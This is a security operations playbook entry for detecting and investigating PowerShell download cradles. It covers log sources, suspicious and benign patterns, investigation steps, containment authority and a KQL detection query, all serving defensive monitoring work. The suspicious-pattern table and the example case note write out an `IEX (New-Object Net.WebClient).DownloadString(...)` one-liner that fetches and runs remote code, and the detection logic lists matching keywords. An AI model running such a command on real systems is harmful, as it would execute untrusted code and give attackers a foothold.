# EP-004 — PowerShell Download Cradle

**Category:** Endpoint - Execution & LOLBins

## Business Risk

**[STAKEHOLDER]** - This is usually the moment a phishing click or a compromised web session turns into an actual foothold: PowerShell reaches out, pulls a second-stage payload from the internet, and runs it entirely in memory. Left unchecked it's the on-ramp to ransomware deployment, credential theft, or a persistent backdoor - and because nothing touches disk in the classic sense, it slips past a lot of signature-based antivirus. Business impact scales fast if the host is a privileged workstation or a server with broad network reach.

## Severity / Priority Default

**High** on initial trigger (unauthenticated download + execution pattern). Downgrade to **Medium** only after confirming the source, destination, and script content are all sanctioned (see Benign Positive section). Never auto-close as Low - the cost of a missed download cradle is disproportionate to the noise it generates.

## MITRE ATT&CK Techniques

- **T1059.001** - Command and Scripting Interpreter: PowerShell
- **T1105** - Ingress Tool Transfer
- **T1027** - Obfuscated Files or Information (base64/encoded command variants)
- **T1204** - User Execution (where the cradle originates from a user opening a document or link)

## Trigger / Detection Logic Summary

A PowerShell process (`powershell.exe` or `pwsh.exe`) is launched with a command line containing a network download primitive (`Net.WebClient`, `Invoke-WebRequest`, `Invoke-RestMethod`, `Net.WebRequest`, `BitsTransfer`) piped directly into an execution primitive (`IEX`, `Invoke-Expression`, `iex`, or assignment to `&`/`. { }` invocation), OR the process is launched with `-EncodedCommand`/`-enc` and script block logging decodes to the same pattern. Detection should fire on the **combination** of "fetch" + "execute" in a single line or a short chain of related events, not on either half alone - `Invoke-WebRequest` by itself is far too common in legitimate admin scripting to be a standalone trigger.

## Required Log Sources & Event IDs

| Source | Event ID | Why |
|---|---|---|
| Sysmon | 1 (Process Creation) | Full command line, parent chain, hashes, integrity level - the anchor event |
| Sysmon | 3 (Network Connection) | Confirms the download actually happened, attributed to powershell.exe/pwsh.exe |
| Sysmon | 22 (DNS Event) | Resolves the domain the cradle is pulling from, tied to the PowerShell PID |
| Sysmon | 11 (FileCreate) | If the cradle writes a dropped file (many don't - fully in-memory) |
| Windows Security | 4688 | Fallback if Sysmon isn't deployed; command line only populated if CLI auditing enabled |
| Microsoft-Windows-PowerShell/Operational | 4104 | Script block text - critical for de-obfuscating `-EncodedCommand` content |
| Microsoft-Windows-PowerShell/Operational | 4103 | Module logging, pipeline execution details, invoked cmdlets |

If 4104 isn't enabled you're investigating half-blind - flag that as a logging gap in the ticket, don't just note it and move on.

## Key Fields to Inspect

**[ANALYST]**
- `CommandLine` (Sysmon 1 / 4688) - look for `IEX`, `DownloadString`, `DownloadFile`, `-nop`, `-w hidden`, `-enc`, `-ExecutionPolicy Bypass`
- `ParentImage` / `ParentCommandLine` - what spawned PowerShell? Outlook, WINWORD.EXE, cmd.exe from a macro, a browser, an HTA? A user double-clicking a script is different from Word spawning it via macro.
- `IntegrityLevel` - medium (user) vs high (elevated) changes containment urgency
- `Hashes` (Sysmon 1) - hash the interpreter itself if it's been replaced/renamed (watch for `powershell.exe` copied to an odd path)
- `DestinationIp`, `DestinationPort`, `Image` on Sysmon 3 - confirm powershell.exe/pwsh.exe made the outbound call, not some unrelated process
- `QueryName`, `QueryResults` on Sysmon 22 - domain reputation, first-seen-in-environment status
- `ScriptBlockText` on 4104 - the decoded/de-obfuscated actual script, including any nested encoded layers
- `User`/`Subject` - service account vs interactive user vs SYSTEM

## Normal vs Suspicious Pattern

| Normal | Suspicious |
|---|---|
| `Invoke-WebRequest` to an internal artifact repo (`https://repo.example.com/...`) run by a known deployment account, scheduled, logged consistently | `IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')` from an interactive user session |
| SCCM/Intune/Chocolatey-driven script pulling from a documented internal or vendor CDN | Download target is a raw IP, a newly-registered domain, or a paste-site/URL-shortener |
| Command line is readable, unobfuscated, matches a change record | `-EncodedCommand` with a long base64 blob, or string concatenation/character substitution to break signature matching |
| Parent process is a scheduled task or deployment agent | Parent process is `winword.exe`, `outlook.exe`, `mshta.exe`, or a browser - i.e., user-facing app spawning a shell |
| Runs during patch/maintenance windows | Runs at odd hours, first-time-seen on this host, immediately followed by a second process spawn (e.g., a dropped binary executing) |

## Investigation Steps

1. Pull the full Sysmon 1 record for the PowerShell process: exact `CommandLine`, `ParentImage`, `ParentCommandLine`, `User`, `IntegrityLevel`, `Hashes`.
2. If `-EncodedCommand` is present, decode it (base64 → often UTF-16LE) and cross-reference against the 4104 `ScriptBlockText` - don't trust the raw command line alone, obfuscation is common and multi-layered.
3. Check Sysmon 3 for outbound connections from the same PID/GUID within seconds of the process launch - capture destination IP, port, and whether it's a domain fronted through a CDN.
4. Check Sysmon 22 for the DNS query tied to the same PID - is the domain newly registered, categorized as uncategorized/parked, or does it resolve to infrastructure with no legitimate business relationship to your org?
5. Look for a follow-on process: did the downloaded content spawn a child process, drop a file (Sysmon 11), write to a Run key (Sysmon 12/13), or create a scheduled task (4698)? This tells you if the cradle succeeded past stage one.
6. Trace the parent chain back to origin - email attachment, macro, browser download, RMM tool, or an already-compromised session. This determines your initial access vector for the writeup.
7. Check for lateral spread: has the same command line, hash, or destination domain shown up on other endpoints in the same time window?
8. Validate against known-good change records (CAB tickets, deployment schedules) before you commit to a verdict either way.

## True Positive Indicators

- `IEX`/`Invoke-Expression` chained directly with a download cmdlet in one line
- Destination is a rare/first-seen external domain or bare IP, especially non-standard ports
- Base64-encoded command that decodes to further obfuscation (nested encoding, char-array reversal)
- Parent process is an Office app, script host, or browser rather than an admin/deployment tool
- Immediate follow-on execution, persistence artifact, or credential-access behavior after the download

## False Positive / Benign Positive Indicators

- Source is a documented internal repository or vendor CDN used by an approved deployment tool (SCCM, Chocolatey, Ansible, Intune win32 app scripts)
- Command line matches a known, version-controlled internal script (compare hash of script content against your repo)
- Parent process is a scheduled task tied to a change ticket, running under a known service account, during a maintenance window
- Security tooling itself (EDR agent updaters, some vulnerability scanners) legitimately uses this pattern to self-update - check your own stack's baseline before escalating

## Escalation Criteria

Escalate to Tier 2/IR immediately if: destination matches known threat intel (C2 IOC, sinkholed domain), a second-stage payload executed and dropped a file or set persistence, the host has domain admin or service-account sessions active, or the same IOC appears on more than one endpoint. Escalate regardless of "it looks blocked" - a denied outbound connection at the proxy still confirms intent and compromise upstream (usually the email/macro that spawned it).

## Containment Options & Approval Authority

**[MANAGEMENT]**
- Single-endpoint EDR network isolation - Tier 2 analyst can execute unilaterally under standard SOC authority, notify on-call IR lead within 15 minutes.
- Kill the PowerShell process and any spawned children - Tier 1/2 analyst, no separate approval needed, log the action in the case.
- Block domain/IP at proxy/firewall - Tier 2 can submit for immediate push if IOC confidence is high; otherwise requires network team sign-off within SLA (target 30 minutes for confirmed malicious).
- Disable the user account if credential compromise is suspected as the entry vector - requires IR lead or manager approval given business disruption; coordinate with the account owner's manager.
- Remove persistence (scheduled task, Run key, service) - Tier 2/3 with change-managed action, documented in the ticket before deletion.

## Example Query (Microsoft Sentinel / KQL, Defender for Endpoint schema)

```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("DownloadString", "DownloadFile", "WebClient", "Net.WebRequest")
    and ProcessCommandLine has_any ("IEX", "Invoke-Expression", "-EncodedCommand", "-enc")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
```

## Closure Criteria

Close as **True Positive** once the download source, script content, and any follow-on behavior are confirmed malicious and contained (host isolated/remediated, IOC blocked, ticket includes full command line and destination). Close as **Benign Positive** when the pattern matches an approved deployment tool or internal repo with a verifiable change record. Close as **Insufficient Evidence** if script block logging wasn't enabled and the command line was truncated/unavailable - don't force a verdict you can't support, but do open a logging-gap action item so the next occurrence isn't blind too.

**Example case note:** *"PowerShell on WKSTN-0447 (user j.alvarez) launched from WINWORD.EXE with `IEX (New-Object Net.WebClient).DownloadString('hxxp://45.x.x.x/upd.ps1')`. Sysmon 3 confirms outbound to 45.x.x.x:80, Sysmon 22 shows domain first-seen in environment, no internal business relationship. Downloaded script (recovered via 4104) attempted to write a scheduled task for persistence - blocked by EDR before creation. Host isolated 09:42 UTC, hash and IP submitted to blocklist, user's macro-enabled document traced to phishing email in ticket EMAIL-8821. Verdict: True Positive, T1059.001/T1105."*
